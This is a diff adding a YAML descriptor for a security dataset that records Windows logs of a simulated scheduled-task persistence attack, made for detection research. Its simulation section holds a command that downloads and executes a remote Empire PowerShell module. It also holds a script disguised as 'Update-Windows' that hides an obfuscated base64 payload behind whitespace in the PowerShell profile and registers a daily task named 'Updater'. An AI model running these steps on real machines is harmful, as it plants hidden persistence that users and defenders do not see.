@@ -1,0 +1,77 @@
+id: 190319-SchTasksCreation-Userland
+title: Userland Scheduled Task Creation
+description: This dataset represents adversaries creating a scheduled task locally from a non-elevated session to maintain persistence in an environment.
+references:
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/03/19
+modification_date: 2022/09/22
+platform:
+  - Windows
+type: atomic
+tags:
+  - Local Scheduled Tasks
+
+attack_mappings:
+  - technique: T1053
+    sub-technique: "005"
+    tactics:
+      - TA0003
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 239.97 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 30.73 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_Security.zip
+    - log_source: Microsoft-Windows-TaskScheduler
+      size: 866.00 B
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_MicrosoftWindowsTaskSchedulerOperational.zip
+
+simulation:
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
+  supportingFileUris:
+  commands: |-
+    Adversary Box
+    -------------
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
+    
+    $InvokeWhoami= { Invoke-Expression whoami }
+    $UserOptions = New-UserPersistenceOption -ScheduledTask -Daily -At '8 AM'
+    $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Daily -At '8 AM'
+    Add-Persistence -ScriptBlock $InvokeWhoami -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
+
+    Victim Box
+    ----------
+    Open a non-elevated PowerShell session
+    Run the contents of the script (Persistence.ps1) created in the previous steps
+
+    FILE:
+    -----
+    function Update-Windows{
+    Param([Switch]$Persist)
+    $ErrorActionPreference='SilentlyContinue'
+    $Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('U/DMK8vPTtV1rSgoSi0uzszPUyjPyE/MzVQAAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
+    if($Persist){
+    if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
+    {$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 08:00:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
+    else
+    {$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC DAILY /ST 08:00:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
+    if(!(Test-Path $Prof)){New-Item -Path $Prof -Type File -Force}
+    ' '*600+$Script.ToString()|Out-File $Prof -A -NoC -Fo
+    iex $Payload|Out-Null
+    Write-Output $Payload}
+    else
+    {$Script.Invoke()}
+    } Update-Windows -Persist
+
+    Run
+    ---
+    .\Persistence.ps1
+  output: |-
+
+references:
